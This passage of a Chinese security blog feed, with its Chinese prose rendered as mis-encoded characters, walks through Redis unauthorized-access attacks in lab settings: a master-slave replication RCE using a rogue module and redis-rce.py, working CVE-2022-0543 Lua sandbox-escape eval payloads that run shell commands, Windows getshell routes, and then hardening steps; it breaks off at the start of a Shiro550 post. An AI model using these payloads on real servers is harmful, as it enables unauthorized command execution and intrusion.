class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">nmap</span> -p <span class="hljs-number">6379</span> --script redis-<span class="hljs-literal">info</span> <span class="hljs-number">192.168.158.143</span><br>åœ°å€ï¼šhttps://svn.nmap.org/nmap/scripts/redis-info.nse<br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20241023182134373.png"></p><h1 id="redisæœªæˆæƒè®¿é—®ï¼ˆä¸»ä»å¤åˆ¶ï¼‰"><a href="#redisæœªæˆæƒè®¿é—®ï¼ˆä¸»ä»å¤åˆ¶ï¼‰" class="headerlink" title="redisæœªæˆæƒè®¿é—®ï¼ˆä¸»ä»å¤åˆ¶ï¼‰"></a>redisæœªæˆæƒè®¿é—®ï¼ˆä¸»ä»å¤åˆ¶ï¼‰</h1><p>æœ¬è´¨ä¹Ÿæ˜¯æœªæˆæƒè®¿é—®ï¼Œä½†æ˜¯å› ä¸ºåªå­˜åœ¨äº4.xã€5.xç‰ˆæœ¬ä¸­ï¼Œæ‰€ä»¥å•ç‹¬å†™å‡ºæ¥</p><p>Redisæä¾›äº†ä¸»ä»æ¨¡å¼ï¼Œä¸»ä»æ¨¡å¼æŒ‡ä½¿ç”¨ä¸€ä¸ªredisä½œä¸ºä¸»æœºï¼Œå…¶ä»–çš„ä½œä¸ºå¤‡ä»½æœºï¼Œä¸»ã€ä»æœºæ•°æ®éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä»æœºåªè´Ÿè´£è¯»ï¼Œä¸»æœºåªè´Ÿè´£å†™ã€‚åœ¨Reids 4.xä¹‹åï¼ŒRedisæ–°å¢äº†æ¨¡å—åŠŸèƒ½ï¼Œé€šè¿‡å¤–éƒ¨æ‹“å±•ï¼Œå¯ä»¥å®ç°åœ¨Redisä¸­å®ç°ä¸€ä¸ªæ–°çš„Rediså‘½ä»¤ï¼Œé€šè¿‡å†™Cè¯­è¨€ç¼–è¯‘å¹¶åŠ è½½æ¶æ„çš„.soæ–‡ä»¶ï¼Œè¾¾åˆ°ä»£ç æ‰§è¡Œçš„ç›®çš„ã€‚</p><p>æ¼æ´ç¼–å·ï¼š<strong>cnvd_2019_21763</strong></p><p><strong>åŸç†ï¼š</strong></p><blockquote><p> Rediså¦‚æœå½“æŠŠæ•°æ®å­˜å‚¨åœ¨å•ä¸ªRedisçš„å®ä¾‹ä¸­ï¼Œå½“è¯»å†™ä½“é‡æ¯”è¾ƒå¤§çš„æ—¶å€™ï¼ŒæœåŠ¡ç«¯å°±å¾ˆéš¾æ‰¿å—ã€‚ä¸ºäº†åº”å¯¹è¿™ç§æƒ…å†µï¼ŒRediså°±æä¾›äº†ä¸»ä»æ¨¡å¼ï¼Œä¸»ä»æ¨¡å¼å°±æ˜¯æŒ‡ä½¿ç”¨ä¸€ä¸ªrediså®ä¾‹ä½œä¸ºä¸»æœºï¼Œå…¶ä»–å®ä¾‹éƒ½ä½œä¸ºå¤‡ä»½æœºï¼Œå…¶ä¸­ä¸»æœºå’Œä»æœºæ•°æ®ç›¸åŒï¼Œè€Œä»æœºåªè´Ÿè´£è¯»ï¼Œä¸»æœºåªè´Ÿè´£å†™ï¼Œé€šè¿‡è¯»å†™åˆ†ç¦»å¯ä»¥å¤§å¹…åº¦å‡è½»æµé‡çš„å‹åŠ›ï¼Œç®—æ˜¯ä¸€ç§é€šè¿‡ç‰ºç‰²ç©ºé—´æ¥æ¢å–æ•ˆç‡çš„ç¼“è§£æ–¹å¼ã€‚</p><p> åœ¨ä¸¤ä¸ªRediså®ä¾‹è®¾ç½®ä¸»ä»æ¨¡å¼çš„æ—¶å€™ï¼ŒRedisçš„ä¸»æœºå®ä¾‹å¯ä»¥é€šè¿‡FULLRESYNCåŒæ­¥æ–‡ä»¶åˆ°ä»æœºä¸Šï¼Œç„¶ååœ¨ä»æœºä¸ŠåŠ è½½soæ–‡ä»¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œæ‹“å±•çš„æ–°å‘½ä»¤äº†ã€‚</p></blockquote><p><strong>æ¡ä»¶ï¼š</strong></p><blockquote><p>Redis ç‰ˆæœ¬(4.x~5.0.5)ï¼ˆæ–°å¢æ¨¡å—åŠŸèƒ½ï¼Œå¯ä»¥é€šè¿‡Cè¯­è¨€å¹¶ç¼–è¯‘å‡ºæ¶æ„.soæ–‡ä»¶ï¼‰</p><p>rediså¼±å¯†ç æˆ–è€…æ— å¯†ç </p><p>rootå¯åŠ¨redis</p></blockquote><p>åŸç†å€’æ˜¯å¾ˆç®€å•ä¹Ÿå¾ˆæ˜“æ‡‚ï¼Œæ•´ä¸ªè¿˜æ˜¯å»ºç«‹åœ¨redisæœªæˆæƒåŸºç¡€ä¸Šçš„æ¼æ´</p><h2 id="ç¯å¢ƒæ­å»º-1"><a href="#ç¯å¢ƒæ­å»º-1" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>å› ä¸ºä¹‹å‰æœåŠ¡ç«¯æˆ‘æ­å»ºçš„æ˜¯2.xç‰ˆæœ¬çš„ï¼Œè¦é‡æ–°æ­å»ºï¼Œç›´æ¥ç”¨ç°æˆçš„é¶åœºä¹Ÿå¯ä»¥ï¼Œæˆ‘è¿™é‡Œå°±å†æ­å»ºä¸€ä¸ª4.xç‰ˆæœ¬çš„redisï¼Œæ¯•ç«Ÿæ­å»ºredisä¸æ˜¯é‚£ä¹ˆéº»çƒ¦çš„</p><p><a href="https://vulfocus.cn/">https://vulfocus.cn/</a></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">wget</span> http://download.redis.io/releases/redis-<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.<span class="hljs-number">10</span>.tar.gz<br><span class="hljs-attribute">tar</span> -zxf redis-<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.<span class="hljs-number">10</span>.tar.gz   #è§£å‹<br><span class="hljs-attribute">cd</span> redis-<span class="hljs-number">4</span>.<span class="hljs-number">0</span>.<span class="hljs-number">10</span>    #è¿›å…¥è§£å‹çš„æ–‡ä»¶å¤¹å†…<br><span class="hljs-attribute">make</span>  <br><span class="hljs-attribute">make</span> install #ç¼–è¯‘<br></code></pre></td></tr></table></figure><p>åˆ‡æ¢ä¸ªç‰ˆæœ¬å°±å¥½ï¼ŒæŠŠä¹‹å‰2.xç‰ˆæœ¬çš„ä¸œè¥¿è¦†ç›–ä¸€ä¸‹ï¼Œæ³¨æ„è¿™é‡Œè¦å°†é…ç½®æ–‡ä»¶ä¸­çš„bindå‚æ•°æ”¹ä¸º0.0.0.0æˆ–è€…æ³¨é‡Šæ‰ï¼Œå¹¶ä¸”ä¿®æ”¹protected-modeä¸ºnoå…è®¸å¤–è¿</p><p><img src="https://img1.plumstar.cn/upload5image-20241023212507905.png"></p><p><img src="https://img1.plumstar.cn/upload5image-20241023213647188.png"></p><p><img src="https://img1.plumstar.cn/upload5image-20241023212536987.png"></p><h2 id="æ¼æ´éªŒè¯-1"><a href="#æ¼æ´éªŒè¯-1" class="headerlink" title="æ¼æ´éªŒè¯"></a>æ¼æ´éªŒè¯</h2><p>ä¸‹è½½æ¼æ´åˆ©ç”¨å·¥å…·ï¼Œä¹Ÿæœ‰ä¸€ä¸ªæ•´ä½“çš„åˆ©ç”¨é¡¹ç›®ï¼š<a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p>æˆ‘è¿™é‡Œæ˜¯ç”¨äº†å¦ä¸€ä¸ªä½¬çš„è„šæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/n0b0dyCN/RedisModules-ExecuteCommand<br><span class="hljs-built_in">cd</span> RedisModules-ExecuteCommand/<br>make <span class="hljs-comment"># ç”Ÿæˆmodule.so</span><br></code></pre></td></tr></table></figure><p>ä¸‹è½½åˆ©ç”¨è„šæœ¬å¹¶è¿è¡Œ</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs vim">git clone https://github.<span class="hljs-keyword">com</span>/Ridter/redis-rce.git<br>pip install -r requirements.txt #å®‰è£…æ‰€éœ€ä¾èµ–<br><span class="hljs-keyword">python</span> redis-rce.<span class="hljs-keyword">py</span> -r <span class="hljs-number">192.168</span>.<span class="hljs-number">158.143</span> -<span class="hljs-keyword">p</span> <span class="hljs-number">6379</span> -L <span class="hljs-number">192.168</span>.<span class="hljs-number">158.141</span> -<span class="hljs-keyword">f</span> <span class="hljs-built_in">exp</span>.<span class="hljs-keyword">so</span> #è¿™ä¸ª<span class="hljs-built_in">exp</span>å°±æ˜¯ä¸Šé¢ç”Ÿæˆçš„module.<span class="hljs-keyword">so</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20241023220951181.png"></p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p>æœ¬è´¨ä¸Šè¿˜æ˜¯å› ä¸ºæœªæˆæƒè®¿é—®å¯¼è‡´çš„å‘½ä»¤æ‰§è¡Œæ¼æ´</p><h1 id="Redis-Luaæ²™ç›’ç»•è¿‡å‘½ä»¤æ‰§è¡Œ"><a href="#Redis-Luaæ²™ç›’ç»•è¿‡å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="Redis Luaæ²™ç›’ç»•è¿‡å‘½ä»¤æ‰§è¡Œ"></a>Redis Luaæ²™ç›’ç»•è¿‡å‘½ä»¤æ‰§è¡Œ</h1><p>ä¹Ÿæ˜¯å»ºç«‹åœ¨æœªæˆæƒè®¿é—®çš„åŸºç¡€ä¸Šäº§ç”Ÿçš„è¯¥æ¼æ´</p><h2 id="æ¼æ´æè¿°åŠå½±å“èŒƒå›´"><a href="#æ¼æ´æè¿°åŠå½±å“èŒƒå›´" class="headerlink" title="æ¼æ´æè¿°åŠå½±å“èŒƒå›´"></a>æ¼æ´æè¿°åŠå½±å“èŒƒå›´</h2><p>Redisæ˜¯è‘—åçš„å¼€æºKey-Valueæ•°æ®åº“ï¼Œå…¶å…·å¤‡åœ¨æ²™ç®±ä¸­æ‰§è¡ŒLuaè„šæœ¬çš„èƒ½åŠ›</p><p>Debianä»¥åŠUbuntuå‘è¡Œç‰ˆçš„æºåœ¨æ‰“åŒ…Redisæ—¶ï¼Œä¸æ…åœ¨Luaæ²™ç®±ä¸­é—ç•™äº†ä¸€ä¸ªå¯¹è±¡packageï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªå¯¹è±¡æä¾›çš„æ–¹æ³•åŠ è½½åŠ¨æ€é“¾æ¥åº“libluaé‡Œçš„å‡½æ•°ï¼Œè¿›è€Œé€ƒé€¸æ²™ç®±æ‰§è¡Œä»»æ„å‘½ä»¤ï¼›è¦åˆ©ç”¨æ­¤æ¼æ´ï¼Œæ”»å‡»è€…éœ€å…·æœ‰æ‰§è¡Œ eval å‘½ä»¤çš„æƒé™ï¼ˆæ”»å‡»è€…ç»è¿‡è®¤è¯ã€æˆ–è€… Redis æœ¬èº«æœªè®¾ç½®é‰´æƒæ£€æŸ¥ï¼‰</p><p>åªå½±å“è¿è¡Œåœ¨ Debian ç³»çš„ Linux å‘è¡Œç‰ˆç³»ç»Ÿï¼ˆDebianã€Ubuntu ç­‰ï¼‰ä¸Šçš„ Redis æœåŠ¡ï¼Œå…¶ä»–ç³»ç»Ÿä¸Šçš„ Redis æœåŠ¡ä¸å—å½±å“ã€‚</p><p>æ¼æ´ç¼–å·ï¼š<strong>CVE-2022-0543</strong></p><h2 id="ç¯å¢ƒæ­å»º-2"><a href="#ç¯å¢ƒæ­å»º-2" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>é€šä¿—ç‚¹æ¥è®²å°±æ˜¯å€ŸåŠ©Luaæ²™ç®±ä¸­é—ç•™çš„è¿™ä¸ªå¯¹è±¡æä¾›çš„æ–¹æ³•åŠ è½½åŠ¨æ€é“¾æ¥åº“libluaé‡Œçš„å‡½æ•°ï¼Œé€ƒé€¸æ²™ç®±æ‰§è¡Œä»»æ„å‘½ä»¤</p><p>vulfocusåœ¨çº¿é¶åœºã€vulhubæˆ–è€…è‡ªå·±æ­å»ºredis</p><p><a href="https://vulfocus.cn/">https://vulfocus.cn/</a></p><h2 id="æ¼æ´éªŒè¯-2"><a href="#æ¼æ´éªŒè¯-2" class="headerlink" title="æ¼æ´éªŒè¯"></a>æ¼æ´éªŒè¯</h2><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-meta">#è¿æ¥redis</span><br>redis-<span class="hljs-keyword">cli</span> -h ipåœ°å€ -p ç«¯å£å·<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å€ŸåŠ©Luaæ²™ç®±ä¸­é—ç•™çš„å˜é‡<code>package</code>çš„<code>loadlib</code>å‡½æ•°æ¥åŠ è½½åŠ¨æ€é“¾æ¥åº“<code>/usr/lib/x86_64-linux-gnu/liblua5.1.so.0</code>é‡Œçš„å¯¼å‡ºå‡½æ•°<code>luaopen_io</code>ã€‚åœ¨Luaä¸­æ‰§è¡Œè¿™ä¸ªå¯¼å‡ºå‡½æ•°ï¼Œå³å¯è·å¾—<code>io</code>åº“ï¼Œå†ä½¿ç”¨å…¶æ‰§è¡Œå‘½ä»¤ï¼š</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œä¸åŒç¯å¢ƒä¸‹çš„libluaåº“è·¯å¾„ä¸åŒï¼Œä½ éœ€è¦æŒ‡å®šä¸€ä¸ªæ­£ç¡®çš„è·¯å¾„ã€‚Vulhubç¯å¢ƒï¼ˆUbuntu fiocalï¼‰ä¸­ï¼Œè¿™ä¸ªè·¯å¾„æ˜¯<code>/usr/lib/x86_64-linux-gnu/liblua5.1.so.0</code>ã€‚</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">#è·å–id<br><span class="hljs-built_in">eval</span> &#x27;<span class="hljs-built_in">local</span> io_l = package.loadlib(<span class="hljs-string">&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;</span>, <span class="hljs-string">&quot;luaopen_io&quot;</span>); <span class="hljs-built_in">local</span> io = io_l(); <span class="hljs-built_in">local</span> f = io.popen(<span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>); <span class="hljs-built_in">local</span> res = f:<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;*a&quot;</span>); f:<span class="hljs-built_in">close</span>(); <span class="hljs-built_in">return</span> res&#x27; <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20241024004739364.png"></p><p>è¿™é‡Œæ˜¯åœ¨çº¿é¶åœºï¼Œç›´æ¥åœ¨å¯¹åº”ç›®å½•ä¸‹æ‰¾flagå³å¯</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">#æ‰§è¡Œå‘½ä»¤ls /tmpè·å–flag<br><span class="hljs-built_in">eval</span> &#x27;<span class="hljs-built_in">local</span> io_l = package.loadlib(<span class="hljs-string">&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;</span>, <span class="hljs-string">&quot;luaopen_io&quot;</span>); <span class="hljs-built_in">local</span> io = io_l(); <span class="hljs-built_in">local</span> f = io.popen(<span class="hljs-string">&quot;ls /tmp&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>); <span class="hljs-built_in">local</span> res = f:<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;*a&quot;</span>); f:<span class="hljs-built_in">close</span>(); <span class="hljs-built_in">return</span> res&#x27; <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><img src="https://img1.plumstar.cn/upload5image-20241024004906634.png"></p><h2 id="ä¿®å¤æªæ–½"><a href="#ä¿®å¤æªæ–½" class="headerlink" title="ä¿®å¤æªæ–½"></a>ä¿®å¤æªæ–½</h2><p>ç›®å‰å®˜æ–¹å·²æœ‰å®‰å…¨ç‰ˆæœ¬ï¼Œè¯·å—å½±å“çš„ç”¨æˆ·å°½å¿«å‡çº§è‡³å®‰å…¨ç‰ˆæœ¬è¿›è¡Œé˜²æŠ¤ï¼Œå‚è€ƒé“¾æ¥ï¼š#1005787 - redis: CVE-2022-0543 - Debian Bug report logsã€‚</p><p>å®‰å…¨ç‰ˆæœ¬ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Debian</span> Redisï¼š<br><span class="hljs-attribute">5</span>:<span class="hljs-number">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">14</span>-<span class="hljs-number">1</span>+deb10u2<br><span class="hljs-attribute">5</span>:<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">16</span>-<span class="hljs-number">1</span>+deb11u2<br><span class="hljs-attribute">5</span>:<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">16</span>-<span class="hljs-number">2</span><br><br><span class="hljs-attribute">Ubuntu</span> Redisï¼š<br><span class="hljs-attribute">5</span>:<span class="hljs-number">6</span>.<span class="hljs-number">0</span>.<span class="hljs-number">15</span>-<span class="hljs-number">1</span>ubuntu0.<span class="hljs-number">1</span><br><span class="hljs-attribute">5</span>:<span class="hljs-number">5</span>.<span class="hljs-number">0</span>.<span class="hljs-number">7</span>-<span class="hljs-number">2</span>ubuntu0.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h1 id="Windowsä¸‹å¦‚ä½•getshell"><a href="#Windowsä¸‹å¦‚ä½•getshell" class="headerlink" title="Windowsä¸‹å¦‚ä½•getshell"></a>Windowsä¸‹å¦‚ä½•getshell</h1><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs">å†™å…¥webshellï¼Œéœ€è¦çŸ¥é“webè·¯å¾„<br>å†™å…¥å¯åŠ¨é¡¹ï¼Œéœ€è¦ç›®æ ‡æœåŠ¡å™¨é‡å¯<br>å†™å…¥MOFï¼ŒMOFæ¯éš”5ç§’é’Ÿä¼šè‡ªåŠ¨æ‰§è¡Œä¸€æ¬¡ï¼Œé€‚ç”¨äºWindows2003ã€‚<br></code></pre></td></tr></table></figure><h1 id="æ‰¹é‡æ£€æµ‹æœªæˆæƒredisè„šæœ¬"><a href="#æ‰¹é‡æ£€æµ‹æœªæˆæƒredisè„šæœ¬" class="headerlink" title="æ‰¹é‡æ£€æµ‹æœªæˆæƒredisè„šæœ¬"></a>æ‰¹é‡æ£€æµ‹æœªæˆæƒredisè„šæœ¬</h1><p><a href="https://github.com/Ridter/hackredis">https://github.com/Ridter/hackredis</a></p><h1 id="ä¿®å¤æ–¹å¼åŠåŠ å›º"><a href="#ä¿®å¤æ–¹å¼åŠåŠ å›º" class="headerlink" title="ä¿®å¤æ–¹å¼åŠåŠ å›º"></a>ä¿®å¤æ–¹å¼åŠåŠ å›º</h1><p>1ã€ç¦æ­¢ä¸€äº›é«˜å±å‘½ä»¤ï¼ˆé‡å¯redisæ‰èƒ½ç”Ÿæ•ˆ)</p><ul><li>ä¿®æ”¹ redis.conf æ–‡ä»¶ï¼Œç¦ç”¨è¿œç¨‹ä¿®æ”¹ DB æ–‡ä»¶åœ°å€</li></ul><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-title">FLUSHALL</span> <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-title">CONFIG</span> <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-title">EVAL</span> <span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure><ul><li>æˆ–è€…é€šè¿‡ä¿®æ”¹redis.confæ–‡ä»¶ï¼Œæ”¹å˜è¿™äº›é«˜å±å‘½ä»¤çš„åç§°</li></ul><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-title">FLUSHALL</span> <span class="hljs-string">&quot;name1&quot;</span><br><br><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-title">CONFIG</span> <span class="hljs-string">&quot;name2&quot;</span><br><br><span class="hljs-built_in">rename</span>-<span class="hljs-keyword">command</span> <span class="hljs-title">EVAL</span> <span class="hljs-string">&quot;name3&quot;</span><br></code></pre></td></tr></table></figure><p>2ã€ä»¥ä½æƒé™è¿è¡Œ Redis æœåŠ¡ï¼ˆé‡å¯redisæ‰èƒ½ç”Ÿæ•ˆï¼‰</p><p>ä¸º Redis æœåŠ¡åˆ›å»ºå•ç‹¬çš„ç”¨æˆ·å’Œå®¶ç›®å½•ï¼Œå¹¶ä¸”é…ç½®ç¦æ­¢ç™»é™†</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">groupadd -<span class="hljs-attribute">r</span> redis &amp;&amp; useradd -<span class="hljs-attribute">r</span> -<span class="hljs-selector-tag">g</span> redis redis<br></code></pre></td></tr></table></figure><p>3ã€ä¸º Redis æ·»åŠ å¯†ç éªŒè¯ï¼ˆé‡å¯redisæ‰èƒ½ç”Ÿæ•ˆï¼‰</p><p>ä¿®æ”¹ redis.conf æ–‡ä»¶ï¼Œæ·»åŠ </p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">requirepass mypassword<br>ï¼ˆæ³¨æ„redisä¸è¦ç”¨-<span class="hljs-selector-tag">a</span>å‚æ•°ï¼Œæ˜æ–‡è¾“å…¥å¯†ç ï¼Œè¿æ¥åä½¿ç”¨authè®¤è¯ï¼‰<br></code></pre></td></tr></table></figure><p>4ã€ç¦æ­¢å¤–ç½‘è®¿é—® Redisï¼ˆé‡å¯redisæ‰èƒ½ç”Ÿæ•ˆï¼‰</p><p>ä¿®æ”¹ redis.conf æ–‡ä»¶ï¼Œæ·»åŠ æˆ–ä¿®æ”¹ï¼Œä½¿å¾— Redis æœåŠ¡åªåœ¨å½“å‰ä¸»æœºå¯ç”¨</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">bind</span> <span class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p>åœ¨redis3.2ä¹‹åï¼Œrediså¢åŠ äº†protected-modeï¼Œåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹ï¼Œéç»‘å®šIPæˆ–è€…æ²¡æœ‰é…ç½®å¯†ç è®¿é—®æ—¶éƒ½ä¼šæŠ¥é”™ã€‚</p><p>5ã€ä¿®æ”¹é»˜è®¤ç«¯å£</p><p>ä¿®æ”¹é…ç½®æ–‡ä»¶redis.confæ–‡ä»¶</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Port</span> <span class="hljs-number">6379</span><br></code></pre></td></tr></table></figure><p>é»˜è®¤ç«¯å£æ˜¯6379ï¼Œå¯ä»¥æ”¹å˜æˆå…¶ä»–ç«¯å£ï¼ˆä¸è¦å†²çªå°±å¥½ï¼‰</p><p>6ã€ä¿è¯ authorized_keys æ–‡ä»¶çš„å®‰å…¨</p><p>ä¸ºäº†ä¿è¯å®‰å…¨ï¼Œæ‚¨åº”è¯¥é˜»æ­¢å…¶ä»–ç”¨æˆ·æ·»åŠ æ–°çš„å…¬é’¥ã€‚</p><ul><li>å°† authorized_keys çš„æƒé™è®¾ç½®ä¸ºå¯¹æ‹¥æœ‰è€…åªè¯»ï¼Œå…¶ä»–ç”¨æˆ·æ²¡æœ‰ä»»ä½•æƒé™ï¼š</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 400 ~/.ssh/authorized_keys<br></code></pre></td></tr></table></figure><ul><li>ä¸ºä¿è¯ authorized_keys çš„æƒé™ä¸ä¼šè¢«æ”¹æ‰ï¼Œæ‚¨è¿˜éœ€è¦è®¾ç½®è¯¥æ–‡ä»¶çš„ immutable ä½æƒé™:</li></ul><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">chattr +i ~<span class="hljs-regexp">/.ssh/</span>authorized_keys<br></code></pre></td></tr></table></figure><ul><li>ç„¶è€Œï¼Œç”¨æˆ·è¿˜å¯ä»¥é‡å‘½å ~&#x2F;.sshï¼Œç„¶åæ–°å»ºæ–°çš„ ~&#x2F;.ssh ç›®å½•å’Œ authorized_keys æ–‡ä»¶ã€‚è¦é¿å…è¿™ç§æƒ…å†µï¼Œéœ€è¦è®¾ç½® ~.&#x2F;ssh çš„ immutable æƒé™ï¼š</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chattr +i ~/.ssh<br></code></pre></td></tr></table></figure><p>7ã€è®¾ç½®é˜²ç«å¢™ç­–ç•¥</p><p>å¦‚æœæ­£å¸¸ä¸šåŠ¡ä¸­RedisæœåŠ¡éœ€è¦è¢«å…¶ä»–æœåŠ¡å™¨æ¥è®¿é—®ï¼Œå¯ä»¥è®¾ç½®iptablesç­–ç•¥ä»…å…è®¸æŒ‡å®šçš„IPæ¥è®¿é—®RedisæœåŠ¡ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>å®‰å…¨é—®é¢˜æ•´ç†</category>
      
    </categories>
    
    
    <tags>
      
      <tag>redis</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaååºåˆ—åŒ–Shiroç¯‡01-Shiro550æµç¨‹åˆ†æ</title>
    <link href="/2025/08/24/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/"/>
    <url>/2025/08/24/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Shiro%E7%AF%8701-Shiro550%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="0x01-å‰è¨€"><a href="#0x01-å‰è¨€" class="headerlink" title="0x01 å‰è¨€"></a>0x01 å‰è¨€</h1><p><strong>shiro550 çš„æ ¹æœ¬åŸå› ï¼šå›ºå®š key åŠ å¯†</strong></p><p>è€æ¼æ´äº†ï¼Œä¸è¿‡ä¹‹å‰å†™çš„ä¸çŸ¥é“è®©æˆ‘ä¸¢å“ªé‡Œå»äº†ï¼Œåªå‰©ä¸‹å¤ç°åœ¨ï¼Œä¸Šä¸€ç¯‡æ–‡ç« æœ‰ç®€å•å¤ç°ï¼Œä½†æ˜¯é‚£ä¸ªè·ŸæŠ€æœ¯å°±ä¸æ²¾è¾¹äº†ï¼Œé‡æ–°å†™ä¸€ä¸‹æ¼æ´çš„åˆ†æè€Œä¸”ç°åœ¨CommonsCollectionsé“¾ä¹Ÿå·²ç»å‡ºåˆ°è¿™ä¹ˆå¤šäº†</p><p>ä»»ä½•ååºåˆ—åŒ–æ¼æ´è¿˜æ˜¯è¦å€ŸåŠ©å…·ä½“æ¡ˆä¾‹æ¥è¿›è¡Œå­¦ä¹ ï¼Œè«åå…¶å¦™å°±å†™äº†7kå¤š</p><h1 id="0x02-ç¯å¢ƒ"><a href="#0x02-ç¯å¢ƒ" class="headerlink" title="0x02 ç¯å¢ƒ"></a>0x02 ç¯å¢ƒ</h1><p>ç”¨çš„ç¯å¢ƒæ˜¯ä¸‹é¢çš„ï¼Œjdkå’Œtomcatä¸åŒç‰ˆæœ¬æˆ‘æ²¡æœ‰è¯•è¿‡</p><ul><li>jdk8u65</li><li><a href="https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.81/bin/">Tomcat8</a></li><li>shiro 1.2.4</li></ul><p>ç¯å¢ƒå°±ä¸èƒ½ç”¨dockeräº†ï¼Œjdk8u65 å’Œ tomcat8 çš„é…ç½®ï¼Œä¸€æ­¥æ­¥å®‰è£…å³å¯ï¼Œæ 